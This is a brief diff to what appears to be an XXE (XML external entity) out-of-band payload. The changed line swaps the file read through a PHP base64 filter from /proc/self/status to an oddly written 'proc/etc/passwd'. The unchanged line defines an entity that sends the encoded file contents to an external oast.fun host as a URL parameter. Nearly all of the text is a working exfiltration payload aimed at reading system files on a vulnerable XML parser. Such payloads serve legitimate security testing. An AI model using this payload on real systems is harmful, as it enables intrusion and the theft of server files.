@@ -1,2 +1,2 @@
-<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=proc/self/status">
+<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=proc/etc/passwd">
 <!ENTITY % param1 "<!ENTITY exfil SYSTEM 'ncbvfqlodvtfrbbhnsfi8ug0iftti59kf.oast.fun/?exfil=%data;'>">
